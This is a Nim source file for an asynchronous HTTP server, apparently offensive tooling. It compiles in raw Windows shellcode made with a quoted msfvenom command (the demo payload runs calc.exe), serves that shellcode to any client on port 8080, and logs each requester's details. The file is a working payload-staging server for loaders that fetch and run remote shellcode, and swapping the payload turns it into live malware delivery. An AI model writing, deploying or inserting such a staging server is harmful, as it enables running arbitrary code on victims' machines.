#[
  nim c -d:release .\server.nim
]#
import std/[asyncdispatch, asynchttpserver, strformat]

# msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o sc.raw
const buf = slurp("./sc.raw")

proc payload(req: Request) {.async.} =
  echo &"[+]: Connection information:  {(req.reqMethod, req.url, req.headers)}"
  let headers = {"Content-type": "text/plain; charset=utf-8"}
  await req.respond(Http200, buf, headers.newHttpHeaders())

proc main {.async.} =
  var server = newAsyncHttpServer()
  server.listen(Port(8080))
  let port = server.getPort()
  echo "[+] Listening on localhost:" & $port.uint16
  while true:
    if server.shouldAcceptRequest():
      await server.acceptRequest(payload)
    else:
      # too many concurrent connections, `maxFDs` exceeded, wait 500ms for FDs to be close
      await sleepAsync(500)

when isMainModule:
  waitFor main()